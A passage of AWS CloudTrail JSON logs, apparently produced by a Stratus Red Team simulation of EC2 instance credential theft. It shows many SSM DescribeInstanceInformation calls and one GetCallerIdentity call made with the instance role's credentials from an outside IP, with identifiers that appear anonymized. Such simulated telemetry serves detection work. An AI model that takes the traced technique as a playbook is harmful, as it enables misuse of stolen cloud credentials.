\"Management\",\n      \"eventID\": \"1d6a4901-4b35-4e4c-8569-a15fde667507\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:01Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"fc69ddbc-31ee-4435-80d7-d5186c01d2a1\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8b5891ab-9638-4c56-aa27-8c43dacbf6fb\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:54Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"968528a1-fb69-454b-b895-87df48493598\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a4ac2342-6c2d-4d54-9308-e20b7d537063\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:43Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"48ac6ca0-0d3c-4cca-80d4-65cca1e7cf50\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8aa86ee3-7789-4248-a0b3-779a720a31bd\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:42Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"1a8b3f8f-0829-4e0c-bce4-a28c0e783f51\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b379479b-05c9-4c3c-af4b-cbd43acf29e1\",\n      \"eventName\": \"GetCallerIdentity\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:55Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"e46e7e10-ae9e-4170-b205-5d327c156416\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIAP5CT9NN8EYVU1FXV\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:sts::017622104382:assumed-role/stratus-red-team-ec2-steal-credentials-role/i-786a3A8B5C0d92eF4\",\n         \"principalId\": \"AROALHCCSKSM395EGX3XN:i-786a3A8B5C0d92eF4\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-08-02T08:20:52Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"ec2RoleDelivery\": \"1.0\",\n            \"sessionIssuer\": {\n               \"accountId\": \"017622104382\",\n               \"arn\": \"arn:aws:iam::017622104382:role/stratus-red-team-ec2-steal-credentials-role\",\n               \"principalId\": \"AROALHCCSKSM395EGX3XN\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-steal-credentials-role\"\n            },\n            \"webIdFederationData\": {}\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"be2ec885-070c-4fc0-8c5a-11e8dfe65351\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:24Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"7f6ff28c-e7c0-4634-9d18-1f3e6157a5f5\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f9d500d1-d469-409f-b8b0-b0fea46b927a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"b4d8f210-46fc-4ca3-b03f-065a49cd9dbc\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"501997e8-265d-44e3-92ee-228e7e155cef\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:58Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"d76263e1-e1ab-4da1-9c74-ae146a06a390\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1928dbd9-a8ff-4965-bfb7-cfd7884933cf\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"db31fb93-2471-4747-bd7b-0aa6d2ada9db\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"48c0979a-5d65-43f7-aa41-914d1ac0348b\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:55Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"c8f99ffe-e27c-41ab-84a4-9be8d40e8e96\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"73e1044f-14fd-4e57-a515-5fa1b33ee465\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:53Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"5377091e-7b64-4951-8d5b-38f5e6ed733a\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"fbe51d19-8701-4214-8715-479c3765fd63\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"9eb25ff8-973a-4bb8-a12c-2b27fdc5f434\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0ad6b57e-2afc-4cbf-b618-b412445b3795\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"fd973fdc-43ed-418f-bd56-70c7bfb6beb0\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ceffab54-0d57-4970-b1fd-6c735c624531\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"13bbbae5-9186-499a-8613-a50fcd752cad\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"abe4f64f-4edd-4269-888e-bd53a143a2b6\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:47Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"a475561e-0013-4f7e-80e7-9f2067b4b4bf\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"46e1e497-e386-4b89-9769-7c8d94d69c74\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:45Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"8b440237-44a9-4cad-8115-1d1015b9e7b4\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"92804077-0177-4385-bcf8-97b0291538fd\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:44Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"4bd629c0-ee97-4b2c-a779-2451cd91213a\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"061a2c00-e72a-4126-9487-1724c2f6a37a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:40Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"f8b97bc6-cf13-476f-9e1b-5f005682ad9e\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"57f3b958-1c3b-458a-b60f-52310b597f49\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:22:39Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"32a9ae7b-8cae-4b6c-93ff-081ee7a5355b\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"394cf343-b9cf-48ce-8a94-e188656ae8ba\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:56Z\",\n      \"eventType\": 